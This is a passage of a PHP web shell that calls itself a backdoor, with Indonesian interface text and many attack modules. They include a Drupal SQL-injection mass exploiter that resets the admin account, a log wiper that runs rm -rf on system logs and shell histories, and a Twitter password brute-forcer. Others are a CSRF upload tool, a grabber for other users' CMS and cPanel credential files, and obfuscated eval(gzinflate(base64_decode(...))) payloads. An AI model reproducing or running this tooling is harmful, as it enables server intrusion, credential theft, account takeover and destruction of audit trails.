                if (preg_match("/$nama_doang/", $output_mkfile)) {
                    echo "<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                } else {
                    echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";
                    $upload_ah = ngirim("$korban?cmd=upload", $post2);
                    if (preg_match("/$nama_doang/", $upload_ah)) {
                        echo "<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
                    } else {
                        echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";
                    }
                }
            }
        }

    } 

elseif ($_GET['do'] == cmsvuln) {
        @set_time_limit(0);
        @error_reporting(0);
        // Script Functions , start ..!
        function ask_exploit_db($component) {
            $exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
            $result = @file_get_contents($exploitdb);
            if (eregi("No results", $result)) {
                echo "<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
            } else {
                echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
            }
        }
        /**************************************************************/
        /* Joomla Conf */
        function get_components($site) {
            $source = @file_get_contents($site);
            preg_match_all('{option,(.*?)/}i', $source, $f);
            preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
            preg_match_all('{/components/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $comm) {
                echo "<tr><td>$comm</td>";
                ask_exploit_db($comm);
            }
        }
        /**************************************************************/
        /* WP Conf */
        function get_plugins($site) {
            $source = @file_get_contents($site);
            preg_match_all("#/plugins/(.*?)/#i", $source, $f);
            $plugins = array_unique($f[1]);
            if (count($plugins) == 0) {
                echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach ($plugins as $plugin) {
                echo "<tr><td>$plugin</td>";
                ask_exploit_db($plugin);
            }
        }
        /**************************************************************/
        /* Nuke's Conf */
        function get_numod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{?name=(.*?)/}i', $source, $f);
            preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
            preg_match_all('{/modules/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $nmod) {
                echo "<tr><td>$nmod</td>";
                ask_exploit_db($nmod);
            }
        }
        /*****************************************************/
        /* Xoops Conf */
        function get_xoomod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{/modules/(.*?)/}i', $source, $f);
            $arz = array_merge($f[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $xmod) {
                echo "<tr><td>$xmod</td>";
                ask_exploit_db($xmod);
            }
        }
        /**************************************************************/
        /* Header */
        function t_header($site) {
            echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';
            echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';
        }
        echo "<center>";
        echo '<div class="mybox" style="text-align:center">
<h1>CMS Vulnerability Scanner</h1><hr color="white">
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="submit" style="width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center>';
        // Start Scan :P :P ...
        if ($_POST) {
            $site = strip_tags(trim($_POST['site']));
            t_header($site);
            echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
            echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
            echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
            echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
        }

}

elseif ($_GET['do'] == 'drupal') {
		echo "<center>";
        echo "<div class='mybox'>
<h1>Drupal Mass Exploiter</h1><hr color='white'><br>
<form method='post' action=''>
<textarea rows='10'class='mybox' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
<input type='submit' class='kotak' style='border-color:white' name='submit' value='SIKAT!'>
</form>
</div></center>
";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
            $filename = $_FILES['file']['name'];
            $filetmp = $_FILES['file']['tmp_name'];
            echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
            move_uploaded_file($filetmp, $filename);
        }
        error_reporting(0);
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'Exorcism' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
                $ctx = stream_context_create($params);
                $data = file_get_contents($url . '/user/login/', null, $ctx);
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    $fp = fopen("exploited.txt", 'a+');
                    fwrite($fp, "Exploitied  User: Exorcism Pass: Exorcism  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='lime'><b>Success:<font color='white'>Exorcism</font> Pass:<font color='white'>Exorcism</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
                } else {
                    echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
                }
            }
            $urls = explode("
", $_POST['url']);
            foreach ($urls as $url) {
                $url = @trim($url);
                echo exploit($url);
            }
        }

}


elseif($_GET['do'] == 'ports') {
    echo '<table><tr><th><center><u>Port Scanner</u></tr></th></center><td>';
    echo '<div class="content">';
    echo '<form action="" method="post">';
    
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        $start = strip_tags($_POST['start']);
        $end = strip_tags($_POST['end']);
        $host = strip_tags($_POST['host']);
        for($i = $start; $i<=$end; $i++){
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if($fp){
                echo 'Port '.$i.' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
              Host:<br> <input type="text" name="host" value="localhost"/><br /><br />
              Port start: <br><input type="text" name="start" value="0"/><br /><br />
              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
              <input type="submit" value="Scan Ports" />
              </form></center><br /><br />';echo "</center>";
    echo '</div></table></td>';


}
}

elseif($_GET['do'] == 'logs') {
  	echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
	echo"</td></tr></table>";
}


elseif ($_GET['do'] == 'zip') {
		echo "<center>";
        echo "<div class='mybox'>";
        echo "<h1>Zip Menu</h1><hr color='white'>";
        function rmdir_recursive($dir) {
            foreach (scandir($dir) as $file) {
                if ('.' === $file || '..' === $file) continue;
                if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
                else unlink("$dir/$file");
            }
            rmdir($dir);
        }
        if ($_FILES["zip_file"]["name"]) {
            $filename = $_FILES["zip_file"]["name"];
            $source = $_FILES["zip_file"]["tmp_name"];
            $type = $_FILES["zip_file"]["type"];
            $name = explode(".", $filename);
            $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
            foreach ($accepted_types as $mime_type) {
                if ($mime_type == $type) {
                    $okay = true;
                    break;
                }
            }
            $continue = strtolower($name[1]) == 'zip' ? true : false;
            if (!$continue) {
                $message = "Itu Bukan Zip  , , GOBLOK COK";
            }
            $path = dirname(__FILE__) . '/';
            $filenoext = basename($filename, '.zip');
            $filenoext = basename($filenoext, '.ZIP');
            $targetdir = $path . $filenoext;
            $targetzip = $path . $filename;
            if (is_dir($targetdir)) rmdir_recursive($targetdir);
            mkdir($targetdir, 0777);
            if (move_uploaded_file($source, $targetzip)) {
                $zip = new ZipArchive();
                $x = $zip->open($targetzip);
                if ($x === true) {
                    $zip->extractTo($targetdir);
                    $zip->close();
                    unlink($targetzip);
                }
                $message = "<b>Sukses Cok :)</b>";
            } else {
                $message = "<b>Error Jancok :(</b>";
            }
        }
        echo '<table style="width:100%" border="1">
<div class="mybox"><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" class="kotak" name="submit" value="Upload And Unzip" />
</form><br><br></div>';
        if ($message) echo "<p>$message</p>";
        echo "<div class='mybox'><h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input type='text' name='save' value='$dir/Exorcism_backup.zip' style='width: 450px;' height='10'><br><br>
<input type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br></div>";
        if ($_POST['backup']) {
            $save = $_POST['save'];
            function Zip($source, $destination) {
                if (extension_loaded('zip') === true) {
                    if (file_exists($source) === true) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                            $source = realpath($source);
                            if (is_dir($source) === true) {
                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
                                foreach ($files as $file) {
                                    $file = realpath($file);
                                    if (is_dir($file) === true) {
                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                    } else if (is_file($file) === true) {
                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                    }
                                }
                            } else if (is_file($source) === true) {
                                $zip->addFromString(basename($source), file_get_contents($source));
                            }
                        }
                        return $zip->close();
                    }
                }
                return false;
            }
            Zip($_POST['dir'], $save);
            echo "Selesai , Save To <b>$save</b>";
        }
        echo "
    <div class='mybox'><h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/Exorcism_unzip' style='width: 450px;' height='10'><br><br>
    <input type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    </div>";
        if ($_POST['extrak']) {
            $save = $_POST['save'];
            $zip = new ZipArchive;
            $res = $zip->open($_POST['dir']);
            if ($res === TRUE) {
                $zip->extractTo($save);
                $zip->close();
                echo 'Succes , Location : <b>' . $save . '</b>';
            } else {
                echo 'Gagal Cok :( Ntahlah !';
            }
        }
        echo '</table>';
        echo "</div>";;

}

elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}

elseif($_GET['do'] == 'logout') {
	

echo '<form action="?dir=$dir&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Terimakasih Telah Menggunakan Backdoor ini . Sad To See You Go :(';
}elseif($_GET['do'] == 'about') {
	
    echo '<center>Just A Person Who Loves Technology :)</center>';
} elseif($_GET['do'] == 'contact') {
	echo "<center><br><font size='6'>--=[ Contact Me ]=--</font><br><br>
	<table><td style='background-color: transparent;text-align:center;border: 2px lime dotted;width:300px;height:250px;'>
	<font color='white'>4ever only email no Instagram , Twitter , Facebook , And Other <br>Email : bapakuheker@protonmail.com</font><br></tr></td></table></center>";

} elseif($_GET['do'] == 'hijack_wp')
	{
$gwtamvan="nUl6QuM4EP58VfyHOR9FipY2KYVdrjTZ5Wvb1b0hXrQfSahlErfxkcTBaSjllv9+4zha0+Vgj4tH1RnPyzMzz9iBDzzncMVnxxGlLlc9DsvJhFaeQp0t8Db319feB+t4gM91InEGNNJc5D4BAhnTiYh9RQilCSr9MApyQ/0ilnhz1gEa5RoUf2D+QfCm2/W/wHQh408ypeBGHrN7+Mj/otENnFZ+twfXfrf7c+Qaq2Dkor3b+LI/E+Z9kRQWE4sSAXF9epQwGuPeKOX5DVWW+g6PUe6AnhcM1xmdMhclDiSSWnwn0boYumHI8nweVpoVTeS9VXHurOiincaYYUykgsbK3fb6A9fbZHQL3L0Ci+OadUhS6jI4dH9eXDpTqrlBTLBZ86DUos5l5Npa1GUXkJWeShLN7jWVjMLf63h1hyUb5iJ02IFVpE8O4af+z+9pQkEAJSE6dGXYL+5OiZTHQve6KZvoIez8m8bj+hrPsdcm0qrvSNex0Jqh5WBja0vtPRrcFi/ZYmjATKkEMZUwhEvhgip1DpWtQll7u0iGA6+434fqfU8zns6HJ5JufB7dQ9AJg0asiN4HC7NTVoKXOIQIMdQqZhBYATTlRnGuFZMAQ8izKSgZ+aQmxHk2G/S8hwevIgNpfsf19vDf7e+6Yvu7u97bwe6e6T8BFyMU3yZMsb3C6pMFS8t+slpgTyNcCIkDUYJQEXB6f5nD77SUXNOcRjjQGtNg0vg8dESlEc7hnOfIoIPzcy5JM1u82Z5JjCeGWQTudU3iWCoimiZzVyGnGQqKdkXP7PNTMdU0pIqNjcnCMA7zLH/ZDtsy4fdaJPv2olKpmDTa4zhcximVxOc7oahFcypbhsUsjsMQIT5KpHPKohStfW/WjbGY5cS0D+V9zyMgxQyX79AbRZuCIVaX3Zb8zieYF/IvMerVZOETYv/q/De/JhJP0yzk9kORZ+ZtD0osm96cGXELDK1QeiVWSIYZYppIFttaxjXPK9ITeO4uuSezwKnHZcO2GHzYGJtk/OJLgWa9Q6hN2dqv3tvbtgMrGkm0R6qr3Y5vJVgVXs2nj5MvbKGw5glGnVMbC+5cYjbuKrK0vUiCxpnrLkjIrBgvziA+gcYlSQs9mpMN6udQNkq36Rj7lLNVaurKeS1G3HcS2QQhIeascFqYlE9pNhf4Tc4UWNEX8q5w6/h9ww2cppT9gR01+dV29KC6PBV2K0nw+qhyfd2WWc475Ors6ODyuO3m4vgSjPW4ukXAagj6q+uNjh34/PH4/Bg+HU4AHpA2GEawH+tAK7VNAth+BYBtBF4F4RFLqksLyPYzQAavAJJK5X0NiuWyc1YqFOt8W6tSQr5+eqrTLAdCY9uPkubEKZbfTvZzY/CGZoKL8lMxBb+yxeVoivfj8Kg544vV7x/ypGn/L+wpndLUxOr14AIPa3bjaf5GXLvEv38A";error_reporting(0);@set_time_limit(0);eval(gzinflate(str_rot13(base64_decode($gwtamvan)))); 

} elseif($_GET['do'] == 'twitterbf') {
echo "<br><center><span style='font-size:30px; color:#009900'>Twitter Multi-Account BruteForce</span></center><br>
<p dir='ltr' align='center'>
<textarea cols='42' class='area' rows='14' name='username' style='width:300px;height:130px;'>Username</textarea> 
<textarea cols='42' class='area' rows='14' name='password' style='width:300px;height:130px;'>Password</textarea><br><br><input type='submit' value='Attack Now'><br></p><br>";
if($_POST['username'] and $_POST['password']){
        #function
        function brute($user,$pass)
        {
                $ch = curl_init();      
                curl_setopt($ch, CURLOPT_URL, "https://twitter.com/intent/session/");
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=&session[username_or_email]={$user}&session[password]={$pass}&remember_me=1");
                curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); #change with your real useragent plz
                
                # cURL - Brute Users & Password
                $login = curl_exec($ch);
                if(eregi("error notice", $login)){
                 
                
                        echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : Username : <font color='red'>$user</font>&nbsp; Incorrect Password =====>: <font color='red'>$pass</font></font></p>"; 
                }else{
                echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : [+] CRACKED SUCCESSFULLY [+]Username : <font color='green'>$user</font>&nbsp; GOOD PASSWORD =====>: <font color='green'>$pass</font></font></p>";
                }
        }
        # POSTS
        $username = explode("n", $_POST['username']);
        $password = explode("n", $_POST['password']);
        
        # Foreach Users N' Textarea
        foreach($username as $users) {
                $users = @trim($users);
        foreach($password as $pass) {
                $pass = @trim($pass);
                brute($users,$pass); }}
        # cURL
        
        }
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Unknown1337, &amp; Recoded by Unknown1337</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Unknown1337</h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
</html>";
}

}

elseif($_GET['do'] == 'configv2') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("Exc_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("Exc_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_Exc) {
			$user_config_dir = "/home/$user_Exc/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_Exc/.my.cnf" => "cpanel",
					"/home/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_Exc/.my.cnf" => "cpanel",
					"/home1/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home1/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home1/$user_Exc/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_Exc/public_html/configuration.php" => "Joomla",
					"/home1/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/wp-config.php" => "WordPress",
					"/home1/$user_Exc/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_Exc/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_Exc/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_Exc/.my.cnf" => "cpanel",
					"/home2/$user_Exc/.accesshash" => "WHM-accesshash",
					"/home2/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_Exc/public_html/forum/config.php" => "phpBB",
					"/home2/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_Exc/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
